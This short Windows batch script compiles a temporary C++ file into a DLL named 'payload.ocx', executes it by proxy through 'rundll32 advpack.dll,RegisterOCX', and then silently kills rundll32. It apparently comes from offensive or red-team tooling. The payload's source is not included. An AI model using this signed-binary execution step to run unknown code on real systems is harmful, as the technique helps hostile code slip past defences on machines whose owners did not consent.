call "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat" x64

cl /nologo /LD "<temp>.cpp" /Fe"payload.ocx" /link /SUBSYSTEM:WINDOWS /DEFAULTLIB:kernel32.lib ole32.lib oleaut32.lib uuid.lib advapi32.lib /MANIFEST:NO

rundll32.exe advpack.dll,RegisterOCX payload.ocx

taskkill /f /im rundll32.exe >nul 2>&1